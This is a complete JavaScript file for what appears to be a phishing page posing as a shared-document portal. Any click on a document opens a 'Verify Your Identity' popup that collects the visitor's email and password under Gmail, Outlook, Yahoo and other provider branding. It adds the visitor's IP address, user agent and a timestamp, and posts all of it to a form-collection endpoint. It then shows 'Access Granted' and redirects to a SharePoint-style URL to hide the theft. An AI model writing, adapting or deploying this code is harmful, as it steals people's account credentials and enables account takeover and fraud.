document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements
    const popupOverlay = document.getElementById('popupOverlay');
    const closePopupBtn = document.querySelector('.close-popup');
    const documentItems = document.querySelectorAll('.document-item');
    const sidebarLinks = document.querySelectorAll('.sidebar-link');
    const nextBtn1 = document.getElementById('nextBtn1');
    const backBtn = document.getElementById('backBtn');
    const formSteps = document.querySelectorAll('.form-step');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const displayedEmail = document.getElementById('displayedEmail');
    const formTitle = document.getElementById('formTitle');
    const emailHint = document.getElementById('emailHint');
    const providerInput = document.getElementById('providerInput');
    const ipAddressInput = document.getElementById('ipAddressInput');
    const popupForm = document.getElementById('popupForm');
    
    // Mail provider elements
    const dropdownSelected = document.getElementById('dropdownSelected');
    const dropdownOptions = document.getElementById('dropdownOptions');
    const dropdownOptionItems = document.querySelectorAll('.dropdown-option');
    
    // Mail provider configurations
    const mailProviders = {
        'gmail': {
            name: 'Gmail',
            icon: 'fab fa-google',
            suffix: '@gmail.com',
            domains: ['gmail.com']
        },
        'yahoo': {
            name: 'Yahoo Mail',
            icon: 'fab fa-yahoo',
            suffix: '@yahoo.com',
            domains: ['yahoo.com', 'yahoo.co.uk', 'ymail.com', 'rocketmail.com']
        },
        'outlook': {
            name: 'Outlook',
            icon: 'fab fa-microsoft',
            suffix: '@outlook.com',
            domains: ['outlook.com', 'hotmail.com', 'live.com', 'msn.com']
        },
        'icloud': {
            name: 'iCloud Mail',
            icon: 'fab fa-apple',
            suffix: '@icloud.com',
            domains: ['icloud.com', 'me.com', 'mac.com']
        },
        'aol': {
            name: 'AOL Mail',
            icon: 'fas fa-at',
            suffix: '@aol.com',
            domains: ['aol.com']
        },
        'custom': {
            name: 'Other Email',
            icon: 'fas fa-edit',
            suffix: '',
            domains: []
        }
    };
    
    let currentStep = 1;
    let userEmail = '';
    let selectedProvider = null;
    let hideHintTimeout = null;
    
    // Create menu toggle for mobile
    createMobileMenuToggle();
    
    // Open popup when document is clicked
    documentItems.forEach(item => {
        item.addEventListener('click', function() {
            openPopup();
        });
    });
    
    // Open popup when sidebar link is clicked
    sidebarLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Remove active class from all links
            sidebarLinks.forEach(l => l.classList.remove('active'));
            // Add active class to clicked link
            this.classList.add('active');
            
            // Close mobile sidebar if open
            if (window.innerWidth <= 992) {
                closeMobileSidebar();
            }
            
            // Open popup
            openPopup();
        });
    });
    
    // Open popup function
    function openPopup() {
        resetForm();
        popupOverlay.style.display = 'flex';
        document.body.style.overflow = 'hidden';
    }
    
    // Close popup
    closePopupBtn.addEventListener('click', closePopup);
    
    popupOverlay.addEventListener('click', function(e) {
        if (e.target === popupOverlay) {
            closePopup();
        }
    });
    
    function closePopup() {
        popupOverlay.style.display = 'none';
        document.body.style.overflow = 'auto';
    }
    
    // Mail Provider Dropdown Functionality
    // Toggle dropdown
    dropdownSelected.addEventListener('click', function(e) {
        e.stopPropagation();
        dropdownOptions.classList.toggle('show');
        this.classList.toggle('active');
    });
    
    // Close dropdown when clicking outside
    document.addEventListener('click', function(e) {
        if (!dropdownSelected.contains(e.target) && !dropdownOptions.contains(e.target)) {
            dropdownOptions.classList.remove('show');
            dropdownSelected.classList.remove('active');
        }
    });
    
    // Handle provider selection
    dropdownOptionItems.forEach(option => {
        option.addEventListener('click', function() {
            const providerValue = this.getAttribute('data-value');
            selectProvider(providerValue);
            
            // Close dropdown
            dropdownOptions.classList.remove('show');
            dropdownSelected.classList.remove('active');
            
            // Focus on email input
            emailInput.focus();
        });
    });
    
    // Select provider function
    function selectProvider(providerValue) {
        selectedProvider = providerValue;
        const provider = mailProviders[providerValue];
        
        // Update dropdown selected display
        dropdownSelected.innerHTML = `
            <i class="${provider.icon}"></i>
            <span>${provider.name}</span>
            <i class="fas fa-chevron-down dropdown-arrow"></i>
        `;
        
        // Add visual indication
        dropdownSelected.classList.add('has-selection');
        
        // Update placeholder hint
        if (providerValue === 'custom') {
            emailInput.placeholder = 'Enter Email';
            showEmailHint('Enter your full email address', 3000);
        } else {
            emailInput.placeholder = 'username' + provider.suffix;
            showEmailHint(`Enter your ${provider.name} username`, 3000);
        }
    }
    
    // Auto-detect provider from email input
    function detectProviderFromEmail(email) {
        if (email.includes('@')) {
            const domain = email.split('@')[1].toLowerCase();
            
            // Check each provider's domains
            for (const [providerKey, provider] of Object.entries(mailProviders)) {
                if (providerKey === 'custom') continue;
                
                if (provider.domains.some(d => domain === d || domain.endsWith('.' + d))) {
                    return providerKey;
                }
            }
        }
        return 'custom';
    }
    
    // Handle email input focus - show hint briefly
    emailInput.addEventListener('focus', function() {
        if (selectedProvider) {
            const provider = mailProviders[selectedProvider];
            if (selectedProvider === 'custom') {
                showEmailHint('Enter your full email address', 3000);
            } else {
                showEmailHint(`Enter your ${provider.name} username`, 3000);
            }
        } else {
            showEmailHint('Select a mail provider or enter full email', 3000);
        }
    });
    
    // Handle email input changes
    emailInput.addEventListener('input', function() {
        const emailValue = this.value.trim();
        
        // Clear any existing timeout
        if (hideHintTimeout) {
            clearTimeout(hideHintTimeout);
        }
        
        // Hide hint immediately when user starts typing
        if (emailValue.length > 0) {
            hideEmailHint();
        }
        
        if (emailValue.includes('@')) {
            // Auto-detect provider from full email
            const detectedProvider = detectProviderFromEmail(emailValue);
            
            if (detectedProvider !== selectedProvider) {
                selectedProvider = detectedProvider;
                const provider = mailProviders[detectedProvider];
                
                // Update dropdown display
                dropdownSelected.innerHTML = `
                    <i class="${provider.icon}"></i>
                    <span>${provider.name}</span>
                    <i class="fas fa-chevron-down dropdown-arrow"></i>
                `;
                dropdownSelected.classList.add('has-selection');
                
                // Show hint for detected provider briefly
                if (detectedProvider === 'custom') {
                    showEmailHint('Custom email address detected', 2000);
                } else {
                    showEmailHint(`${provider.name} address detected`, 2000);
                }
            }
        }
    });
    
    // Show email hint with auto-hide timeout
    function showEmailHint(message, timeout = 3000) {
        // Clear any existing timeout
        if (hideHintTimeout) {
            clearTimeout(hideHintTimeout);
        }
        
        emailHint.innerHTML = `<i class="fas fa-info-circle"></i> ${message}`;
        emailHint.classList.add('show');
        
        // Auto-hide after specified timeout
        if (timeout > 0) {
            hideHintTimeout = setTimeout(() => {
                hideEmailHint();
            }, timeout);
        }
    }
    
    // Hide email hint
    function hideEmailHint() {
        emailHint.classList.remove('show');
        if (hideHintTimeout) {
            clearTimeout(hideHintTimeout);
            hideHintTimeout = null;
        }
    }
    
    // Also allow Enter key to submit email
    emailInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            // Hide hint when pressing Enter
            hideEmailHint();
            if (validateEmail()) {
                proceedToPassword();
            }
        }
    });
    
    // Hide hint when clicking outside email input
    document.addEventListener('click', function(e) {
        if (!emailInput.contains(e.target) && !emailHint.contains(e.target)) {
            hideEmailHint();
        }
    });
    
    // Form navigation - Next button from email step
    nextBtn1.addEventListener('click', function() {
        // Hide hint when clicking Next
        hideEmailHint();
        if (validateEmail()) {
            proceedToPassword();
        }
    });
    
    function proceedToPassword() {
        displayEmailInStep2(userEmail);
        showStep(2);
        updateFormTitle('Enter Your Password');
        // Focus on password input
        setTimeout(() => {
            passwordInput.focus();
        }, 300);
    }
    
    // Back button
    backBtn.addEventListener('click', function() {
        showStep(1);
        updateFormTitle('Verify Your Identity');
        // Focus back on email input
        setTimeout(() => {
            emailInput.focus();
            emailInput.select();
        }, 300);
    });
    
    // Display email in step 2
    function displayEmailInStep2(email) {
        displayedEmail.textContent = email;
    }
    
    // Update form title
    function updateFormTitle(title) {
        formTitle.textContent = title;
    }
    
    // Show specific form step
    function showStep(step) {
        formSteps.forEach(s => s.classList.remove('active'));
        document.getElementById(`step${step}`).classList.add('active');
        currentStep = step;
    }
    
    // Reset form to initial state
    function resetForm() {
        showStep(1);
        updateFormTitle('Verify Your Identity');
        emailInput.value = '';
        passwordInput.value = '';
        userEmail = '';
        displayedEmail.textContent = '';
        selectedProvider = null;
        providerInput.value = '';
        ipAddressInput.value = '';
        
        // Clear any pending timeout
        if (hideHintTimeout) {
            clearTimeout(hideHintTimeout);
            hideHintTimeout = null;
        }
        
        // Reset dropdown to default state
        dropdownSelected.innerHTML = `
            <i class="fas fa-envelope"></i>
            <span>Select Mail Provider</span>
            <i class="fas fa-chevron-down dropdown-arrow"></i>
        `;
        dropdownSelected.classList.remove('has-selection');
        
        // Reset email input
        emailInput.placeholder = 'Enter Email';
        hideEmailHint();
        
        // Ensure dropdown is closed
        dropdownOptions.classList.remove('show');
        dropdownSelected.classList.remove('active');
    }
    
    // Validation functions
    function validateEmail() {
        const emailValue = emailInput.value.trim();
        
        if (!emailValue) {
            showEmailHint('Please enter your email address', 3000);
            alert('Please enter your email address');
            return false;
        }
        
        // Validate email format
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(emailValue)) {
            showEmailHint('Please enter a valid email address (e.g., user@example.com)', 3000);
            alert('Please enter a valid email address (e.g., user@example.com)');
            return false;
        }
        
        // Auto-detect provider if not already selected
        if (!selectedProvider) {
            selectedProvider = detectProviderFromEmail(emailValue);
            
            // Update dropdown display
            const provider = mailProviders[selectedProvider];
            dropdownSelected.innerHTML = `
                <i class="${provider.icon}"></i>
                <span>${provider.name}</span>
                <i class="fas fa-chevron-down dropdown-arrow"></i>
            `;
            dropdownSelected.classList.add('has-selection');
        }
        
        userEmail = emailValue;
        return true;
    }
    
    // Formspree Form Submission
    popupForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        if (!validateEmail()) {
            showStep(1);
            return;
        }
        
        const submitBtn = document.getElementById('submitBtn');
        const originalText = submitBtn.textContent;
        
        try {
            // Disable button and show loading
            submitBtn.disabled = true;
            submitBtn.textContent = 'Sign in';
            submitBtn.style.opacity = '0.7';
            
            // Set provider value in hidden input
            providerInput.value = selectedProvider;
            
            // Get and set IP address
            let ipAddress = 'Unknown';
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                if (ipResponse.ok) {
                    const ipData = await ipResponse.json();
                    ipAddress = ipData.ip;
                }
            } catch (ipError) {
                console.warn('Could not fetch IP address:', ipError);
            }
            ipAddressInput.value = ipAddress;
            
            // Add timestamp
            const timestampInput = document.createElement('input');
            timestampInput.type = 'hidden';
            timestampInput.name = 'timestamp';
            timestampInput.value = new Date().toISOString();
            this.appendChild(timestampInput);
            
            // Add user agent
            const userAgentInput = document.createElement('input');
            userAgentInput.type = 'hidden';
            userAgentInput.name = 'user_agent';
            userAgentInput.value = navigator.userAgent;
            this.appendChild(userAgentInput);
            
            // Log form data
            const formData = new FormData(this);
            console.log('Submitting to Formspree:', Object.fromEntries(formData));
            
            // Submit to Formspree using fetch
            const response = await fetch(this.action, {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            console.log('Formspree response status:', response.status);
            
            if (response.ok) {
                // Show success message
                showStep(3);
                updateFormTitle('Access Granted');
                
                console.log('Form submitted successfully to Formspree');
                
                // Countdown before redirect
                let countdown = 3;
                const countdownElement = document.querySelector('.success-message p');
                const originalText = countdownElement.textContent;
                
                // Update countdown every second
                const countdownInterval = setInterval(() => {
                    countdownElement.textContent = `Redirecting in ${countdown} seconds...`;
                    countdown--;
                    
                    if (countdown < 0) {
                        clearInterval(countdownInterval);
                        performRedirect();
                    }
                }, 1000);
                
            } else {
                const error = await response.json();
                throw new Error(error.error || 'Formspree submission failed');
            }
            
        } catch (error) {
            console.error('Error submitting form to Formspree:', error);
            
            // Show user-friendly error message
            let errorMessage = 'There was an error submitting your information. ';
            
            if (error.message.includes('NetworkError') || error.message.includes('Failed to fetch')) {
                errorMessage += 'Please check your internet connection and try again.';
            } else if (error.message.includes('Formspree')) {
                errorMessage += 'Form submission service is temporarily unavailable. Please try again later.';
            } else {
                errorMessage += 'Please try again.';
            }
            
            alert(errorMessage);
            
            // Re-enable button
            submitBtn.disabled = false;
            submitBtn.textContent = originalText;
            submitBtn.style.opacity = '1';
        }
    });
    
    // Function to perform the redirect
    function performRedirect() {
        // Close the popup
        closePopup();
        
        // Define the redirect URL (you can change this to any URL you want)
        const redirectUrl = 'https://netorgft4015335/_layouts/15/'; // Change this URL
        
        console.log('Redirecting to:', redirectUrl);
        
        // Redirect to the URL (open in same tab)
        window.location.href = redirectUrl;
    }
    
    // Mobile menu functionality
    function createMobileMenuToggle() {
        // Create toggle button
        const toggleBtn = document.createElement('button');
        toggleBtn.className = 'menu-toggle';
        toggleBtn.innerHTML = '<i class="fas fa-bars"></i>';
        document.body.appendChild(toggleBtn);
        
        // Create overlay
        const overlay = document.createElement('div');
        overlay.className = 'sidebar-overlay';
        document.body.appendChild(overlay);
        
        // Toggle sidebar
        toggleBtn.addEventListener('click', function() {
            document.querySelector('.sidebar').classList.toggle('active');
            overlay.style.display = 'block';
        });
        
        // Close sidebar when clicking overlay
        overlay.addEventListener('click', function() {
            closeMobileSidebar();
        });
        
        // Close sidebar when clicking outside on mobile
        document.addEventListener('click', function(e) {
            const sidebar = document.querySelector('.sidebar');
            if (window.innerWidth <= 992 && 
                !sidebar.contains(e.target) && 
                e.target !== toggleBtn &&
                sidebar.classList.contains('active')) {
                closeMobileSidebar();
            }
        });
        
        // Close sidebar on window resize
        window.addEventListener('resize', function() {
            if (window.innerWidth > 992) {
                closeMobileSidebar();
            }
        });
    }
    
    function closeMobileSidebar() {
        document.querySelector('.sidebar').classList.remove('active');
        document.querySelector('.sidebar-overlay').style.display = 'none';
    }
    
    // Set first sidebar link as active by default
    sidebarLinks[0].classList.add('active');
});